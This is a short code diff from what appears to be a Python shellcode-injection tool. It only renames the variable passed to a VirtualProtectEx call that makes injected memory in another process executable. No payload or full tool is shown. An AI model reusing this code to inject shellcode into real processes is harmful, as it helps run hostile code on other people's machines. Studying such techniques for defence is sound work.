@@ -230,10 +230,10 @@ ____________________________________________________________
             ))
             return
 
-        old_protection = ctypes.pointer(wt.DWORD())
+        oldp = ctypes.pointer(wt.DWORD())
         result = self.VirtualProtectEx(
             ph, memptr, len(self.shellcode),
-            self.PAGE_READ_EXECUTE, old_protection
+            self.PAGE_READ_EXECUTE, oldp
         )
         if result == 0:
             print("[-] VirtualProtectEx() Failed - Error Code: {}".format(
